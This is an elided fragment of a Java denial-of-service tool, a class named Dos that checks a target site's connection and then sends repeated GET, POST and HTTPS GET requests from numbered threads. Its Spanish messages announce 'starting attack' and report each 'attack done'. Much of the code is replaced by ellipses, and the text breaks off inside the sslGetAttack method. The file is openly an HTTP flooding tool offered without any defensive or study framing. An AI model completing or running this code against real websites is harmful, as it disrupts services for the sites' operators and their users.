...
public class Dos implements Runnable {
    ...
    public static void main(String[] args) throws Exception {
        ...
        System.out.println("Comprobando la conexión al sitio");
        ...
        System.out.println("Comenzando Ataque");
        ...
        System.out.println("Tema principal finalizado");
    }

    private void checkConnection(String url) throws Exception {
        System.out.println("Comprobando la conexión");
        URL obj = new URL(url);
        ...
        if (responseCode == 200) {
            System.out.println("Conectado al sitio web");
        }
        Dos.url = url;
    }
    ...
    private void postAttack(String url) throws Exception {
        ...
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("POST ataque hecho!: " + responseCode + "Hilo: " + this.seq);
    }
    ...
    private void getAttack(String url) throws Exception {
        ...
        int responseCode = con.getResponseCode();
        System.out.println("GET ataque hecho!: " + responseCode + "Hilo: " + this.seq);
    }
    ...
    private void sslGetAttack(String urltt) throws Exception {
        URL obj = new URL(url);
        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);
